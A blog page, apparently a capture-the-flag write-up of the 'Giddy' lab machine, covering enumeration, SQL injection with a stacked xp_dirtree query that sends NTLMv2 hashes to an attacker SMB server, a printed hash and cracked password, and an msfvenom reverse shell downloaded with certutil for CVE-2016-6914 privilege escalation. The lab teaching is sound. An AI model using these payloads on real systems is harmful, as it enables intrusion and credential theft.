@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <link rel="stylesheet" href="/_assets/css/styles.css"> 
+    <link rel="stylesheet" href="/_assets/css/highlighter.css"> 
+    <link rel="stylesheet" href="/_assets/css/custom.css"> 
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <title>Giddy Writeup</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="/_assets/js/index.js"></script>
+  </head>
+
+  <body class="page-body">
+    <div class="page-body-container">
+      <div class="page-body-content-container">
+        <!-- <h2 class="back-button">&#8592;</h2> -->
+        <header class="post-header-container">
+    <h1 class="header-logo-div">
+        <a href=/ class="header-logo">soh3ee</a>
+    </h1>
+    <nav class="header-items">
+        <a class="header-item">dontclick</a>
+    </nav>
+</header>
+        <h1 class="page-title">Giddy Writeup</h1>
+        
+        
+        
+        
+        <p class="page-date-author-readtime">March 24, 2023 | 8 minutes </p>
+      
+        
+<h1 id="reconnaissance">Reconnaissance</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sCV -p 80,443,3389,5985 -o nmap.txt 10.10.10.104
+# Nmap 7.93 scan initiated Sat Oct 21 14:20:02 2023 as: nmap -sCV -p 80,443,3389,5985 -o nmap.txt 10.10.10.104
+Nmap scan report for 10.10.10.104
+Host is up (0.081s latency).
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+|_ssl-date: 2023-10-21T21:20:31+00:00; 0s from scanner time.
+|_http-title: IIS Windows Server
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| tls-alpn:
+|   h2
+|_  http/1.1
+| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
+| Not valid before: 2018-06-16T21:28:55
+|_Not valid after:  2018-09-14T21:28:55
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: GIDDY
+|   NetBIOS_Domain_Name: GIDDY
+|   NetBIOS_Computer_Name: GIDDY
+|   DNS_Domain_Name: Giddy
+|   DNS_Computer_Name: Giddy
+|   Product_Version: 10.0.14393
+|_  System_Time: 2023-10-21T21:20:16+00:00
+|_ssl-date: 2023-10-21T21:20:31+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=Giddy
+| Not valid before: 2023-10-20T21:09:11
+|_Not valid after:  2024-04-20T21:09:11
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
+# Nmap done at Sat Oct 21 14:20:32 2023 -- 1 IP address (1 host up) scanned in 29.83 seconds
+</code></pre></div></div>
+<p>Visiting the website on port 80 and 443 both returned the same thing. It was the default Windows IIS, but with an image of a happy puppy. :D
+<img src="/_assets/images/writeups/2023-08-30-giddy.md/Pasted image 20231026135750.png" alt="" />
+With the small number of ports open and the seemingly bare Windows IIS server, I decided to directory/file brute-force the URL with <code class="language-plaintext highlighter-rouge">gobuster</code>. I like using the <a href="https://github.com/daviddias/node-dirbuster/blob/master/lists/directory-list-2.3-medium.txt"><code class="language-plaintext highlighter-rouge">directory-list-2.3-medium.txt</code></a>wordlist.</p>
+<h2 id="directoryfile-brute-forcing">Directory/file Brute-forcing</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -w directory-list-2.3-medium.txt -u http://10.10.10.104
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.104
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/remote               (Status: 302) [Size: 157] [--&gt; /Remote/default.aspx?ReturnUrl=%2fremote]
+/mvc                  (Status: 301) [Size: 147] [--&gt; http://10.10.10.104/mvc/]
+...
+/Remote               (Status: 302) [Size: 157] [--&gt; /Remote/default.aspx?ReturnUrl=%2fRemote]
+...
+Progress: 220560 / 220561 (100.00%)
+===============================================================
+Finished
+===============================================================
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">gobuster</code> was able to find 2 meaningful endpoints: <code class="language-plaintext highlighter-rouge">/remote</code> and <code class="language-plaintext highlighter-rouge">/mvc</code>. I checked out <code class="language-plaintext highlighter-rouge">/remote</code> first, which featured Windows PowerShell Web Access portal. It required a pair of credentials, so I initially searched for public exploits that would work with unauthenticated access. Unfortunately, this was not the initial entry point.</p>
+
+<p>I got caught up on this endpoint for a while, but  decided to move on with the intention of finding a pair of credentials instead.
+<img src="/_assets/images/writeups/2023-08-30-giddy.md/Pasted image 20231026134942.png" alt="" /></p>
+
+<h2 id="sql-injection">SQL Injection</h2>
+<p>Visiting the <code class="language-plaintext highlighter-rouge">/mvc</code> endpoint led me to a web application.
+<img src="/_assets/images/writeups/2023-08-30-giddy.md/Pasted image 20231026135151.png" alt="" />
+Clicking on any of the URLs led to what seemed like the result of a simple query.
+<img src="/_assets/images/writeups/2023-08-30-giddy.md/Screenshot 2023-10-26 at 8.03.59 PM.png" alt="" />
+For example, I can imagine that the backend SQL query looks something like this.</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Name</span><span class="p">,</span> <span class="n">ProductNumber</span><span class="p">,</span> <span class="n">Price</span> <span class="k">FROM</span> <span class="n">Product</span> <span class="k">WHERE</span> <span class="n">CategoryId</span> <span class="o">=</span> <span class="o">?</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Assuming the URL parameter (<code class="language-plaintext highlighter-rouge">ProductSubCategoryId</code>) will replace the <code class="language-plaintext highlighter-rouge">?</code>, what could I use to verify that I am able to perform an unintended action? Here’s one way I verified using a single-quote (<code class="language-plaintext highlighter-rouge">'</code>):
+<img src="/_assets/images/writeups/2023-08-30-giddy.md/Pasted image 20231026135209.png" alt="" />
+This meant that the query was somehow being manipulated in an unintended manner. The query with the single-quote would look something like this.</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Name</span><span class="p">,</span> <span class="n">ProductNumber</span><span class="p">,</span> <span class="n">Price</span> <span class="k">FROM</span> <span class="n">Product</span> <span class="k">WHERE</span> <span class="n">CategoryId</span> <span class="o">=</span> <span class="mi">26</span><span class="s1">';
+</span></code></pre></div></div>
+
+<h2 id="initial-access-through-ntlm-theft">Initial Access Through NTLM Theft</h2>
+<p>Being able to successfully break the query means an attacker can manipulate the query because it is not being sanitized in the backend. But breaking the query is not enough to gain initial access. One thing an individual can do is stack queries in <code class="language-plaintext highlighter-rouge">MSSQL</code>, meaning appending queries using the semi-colon (<code class="language-plaintext highlighter-rouge">;</code>) delimiter. But what query to stack? My main goal by having access to <code class="language-plaintext highlighter-rouge">MSSQL</code> query execution is to steal NTLMv2 hashes.</p>
+
+<p>A very brief description of NTLMv2 theft is when a client authenticates to a server over NTLMv2 such as a SMB server. This authentication process reveals the authenticating user’s NTLMv2 hash, which can be cracked using a password cracker such as <code class="language-plaintext highlighter-rouge">hashcat</code>.</p>
+
+<p>To initiate an authentication process through the <code class="language-plaintext highlighter-rouge">MSSQL</code> prompt, I can use the <code class="language-plaintext highlighter-rouge">xp_dirtree</code> command. In a typical <code class="language-plaintext highlighter-rouge">MSSQL</code> prompt, the full command to initiate an authentication using <code class="language-plaintext highlighter-rouge">xp_dirtree</code> to my SMB server would look like this.</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="o">&gt;</span> <span class="k">EXEC</span> <span class="n">master</span> <span class="p">..</span><span class="n">xp_dirtree</span> <span class="s1">'</span><span class="se">\\</span><span class="s1">10.10.14.22</span><span class="se">\s</span><span class="s1">hare'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Hence, the stacked query in the URL would look like this.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18; EXEC master ..xp_dirtree '\\10.10.14.22\share'; --
+</code></pre></div></div>
+
+<p>On top of this, ensure that all necessary characters are URL encoded. Without the correct encoding, the correct characters may not be communicated to/in the backend.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18;%20EXEC%20master%20..xp_dirtree%20%27\\10.10.14.22\share%27;%20--
+</code></pre></div></div>
+
+<p>To start a listening SMB server (attacking machine) that the client (victim machine) would be authenticating to, I used <code class="language-plaintext highlighter-rouge">smbserver.py</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ smbserver.py share . -smb2support
+</code></pre></div></div>
+
+<p>Now, I can initiate an authentication request using my constructed URL.
+<img src="/_assets/images/writeups/2023-08-30-giddy.md/Screenshot 2023-10-27 at 12.04.21 PM.png" alt="" /></p>
+
+<p>And there’s my NTLMv2 hash.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ smbserver.py share . -smb2support
+Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b26 - Copyright 2022 Fortra - forked by ThePorgs
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.104,49713)
+[*] AUTHENTICATE_MESSAGE (GIDDY\Stacy,GIDDY)
+[*] User GIDDY\Stacy authenticated successfully
+[*] Stacy::GIDDY:aaaaaaaaaaaaaaaa:d588d082935b966f9496015349265337:010100000000000080959c650809da012061443fc6c3418d00000000010010006c0041007a006e0078004c0071006400030010006c0041007a006e0078004c00710064000200100051006d00750059004900570050004d000400100051006d00750059004900570050004d000700080080959c650809da01060004000200000008003000300000000000000000000000003000009723e83d8a928d0125f1cec4f75fde0d3e213ae439b0ac33155a857a38b9ed480a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003600000000000000000000000000
+[*] Connecting Share(1:share)
+[*] AUTHENTICATE_MESSAGE (GIDDY\Stacy,GIDDY)
+[*] User GIDDY\Stacy authenticated successfully
+[*] Stacy::GIDDY:aaaaaaaaaaaaaaaa:1f196e17d13979236840229f936717c7:010100000000000080959c650809da01dab3557c6f0f6c8d00000000010010006c0041007a006e0078004c0071006400030010006c0041007a006e0078004c00710064000200100051006d00750059004900570050004d000400100051006d00750059004900570050004d000700080080959c650809da01060004000200000008003000300000000000000000000000003000009723e83d8a928d0125f1cec4f75fde0d3e213ae439b0ac33155a857a38b9ed480a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003600000000000000000000000000
+[*] Disconnecting Share(1:share)
+[*] Closing down connection (10.10.10.104,49713)
+[*] Remaining connections []
+</code></pre></div></div>
+
+<p>Using this command, I can crack the hash. <code class="language-plaintext highlighter-rouge">NTLMv2Hash.txt</code> contains the hash, and <code class="language-plaintext highlighter-rouge">rockyou.txt</code> is the wordlist I am cracking the hash against.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ hashcat -m 5600 NTLMv2Hash.txt rockyou.txt
+</code></pre></div></div>
+
+<p>There was my set of credentials.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>STACY::GIDDY:xNnWo6272k7x
+</code></pre></div></div>
+
+<p><img src="/_assets/images/writeups/2023-08-30-giddy.md/Screenshot 2023-10-27 at 12.32.10 PM.png" alt="" /></p>
+
+<p>And there was my PowerShell access.
+<img src="/_assets/images/writeups/2023-08-30-giddy.md/Screenshot 2023-10-27 at 12.32.42 PM.png" alt="" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Looking around, I found a file named <code class="language-plaintext highlighter-rouge">unifivideo</code>. The sole contents seemed to be ASCII text reading <code class="language-plaintext highlighter-rouge">stop</code>.</p>
+
+<p><img src="/_assets/images/writeups/2023-08-30-giddy.md/Screenshot 2023-10-27 at 12.37.14 PM.png" alt="" />
+I researched programs this file may be related to and discovered it was related to “Ubiquiti UniFi Video”. Searching for “unifivideo exploit” led me to CVE-2016-6914 (Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation).</p>
+
+<p>This exploit exists due to the fact “Ubiquiti UniFi Video for Windows” is installed in <code class="language-plaintext highlighter-rouge">C:\ProgramData\unifi-video\</code> by default. This program also comes with the “Ubiquiti UniFi Video” service, which runs as the <code class="language-plaintext highlighter-rouge">NT AUTHORITY/SYSTEM</code> account.</p>
+
+<p>Because it runs as <code class="language-plaintext highlighter-rouge">NT AUTHORITY/SYSTEM</code> an attacker can take advantage of this if they have permission to control what is being executed. Luckily, this is possible: the <code class="language-plaintext highlighter-rouge">C:\ProgramData</code> directory’s default permissions allow any user to write to the contents of the directory. Because the <code class="language-plaintext highlighter-rouge">C:\ProgramData\unifi-video</code> has no explicit permissions, the default permissions of the <code class="language-plaintext highlighter-rouge">C:\ProgramData</code> directory are inherited.</p>
+
+<p>When the “Ubiquiti UniFi Video” service is started, it looks and tries to execute a file at <code class="language-plaintext highlighter-rouge">C:\ProgramData\unifi-video\taskkill.exe</code>. This file does not exist by default, allowing for Arbitrary Code Execution.</p>
+
+<p>My choice of privilege escalation would be to get a shell, so I opted for a reverse shell in my payload.</p>
+
+<p>To create my reverse shell payload, I used <code class="language-plaintext highlighter-rouge">msfvenom</code> and ran the following command.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f exe &gt; taskkill.exe
+</code></pre></div></div>
+
+<p>Starting my <code class="language-plaintext highlighter-rouge">meterpreter</code> listener.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
+msf6 &gt; use windows/meterpreter/reverse_tcp
+msf6 &gt; set LHOST 10.10.14.22
+msf6 &gt; set LPORT 4444
+msf6 &gt; exploit
+[*] Payload Handler Started as Job 0
+
+[*] Started reverse TCP handler on 10.10.14.22:4444
+</code></pre></div></div>
+
+<p>With my listener running, I grabbed my <code class="language-plaintext highlighter-rouge">taskkill.exe</code> file from my attacking machine to my victim machine using a <code class="language-plaintext highlighter-rouge">python3</code> web server and <code class="language-plaintext highlighter-rouge">certutil</code> on <code class="language-plaintext highlighter-rouge">Powershell</code> to download the file.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\ProgramData\unifi-video&gt; certutil -f -split -urlcache http://10.10.14.22/taskkill.exe
+</code></pre></div></div>
+
+<p><img src="/_assets/images/writeups/2023-08-30-giddy.md/Screenshot 2023-10-30 at 1.11.58 PM.png" alt="" /></p>
+
+<p>Now that my payload is saved into the file that will be executed by the service on start, all I have to do is restart the service.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\ProgramData\unifi-video&gt; Restart-Service -Name "Ubiquiti UniFi Video"
+</code></pre></div></div>
+<p><img src="/_assets/images/writeups/2023-08-30-giddy.md/Screenshot 2023-10-30 at 3.50.05 PM.png" alt="" /></p>
+
+<p>And there was my <code class="language-plaintext highlighter-rouge">meterpreter</code> session. I connected to the session, spawned a shell, and read the <code class="language-plaintext highlighter-rouge">root</code> flag.
+<img src="/_assets/images/writeups/2023-08-30-giddy.md/Screenshot 2023-10-30 at 3.52.28 PM.png" alt="" /></p>
+
+
+        
+      </div>
+      
+      
+      
+  </div> <!-- page-body-container END-->
+  </body>
+  <script>
+  $(document).ready(function() {
+  var toc = $("#toc"); // target the table of contents element
+  var tocEntries = toc.find("a"); // target the links within the table of contents
+  
+  $(window).scroll(function() {
+    // get the current scroll position of the window
+    var currentPosition = $(this).scrollTop();
+    
+    // loop through each link in the table of contents
+    tocEntries.each(function() {
+      // get the ID of the section of content that this link points to
+      var target = $(this).attr("href");
+      
+      // use the ID to target the corresponding section of content
+      var section = $(target);
+      
+      // if the section exists and its top position is within the current viewport
+      if (section.length && section.offset().top <= currentPosition + 200) {
+        // remove the active class from all links in the table of contents
+        tocEntries.removeClass("active");
+        
+        // add the active class to the link that corresponds to the current section
+        $(this).addClass("active");
+      }
+    });
+  });
+  });
+
+  </script>
+
+</html>
+
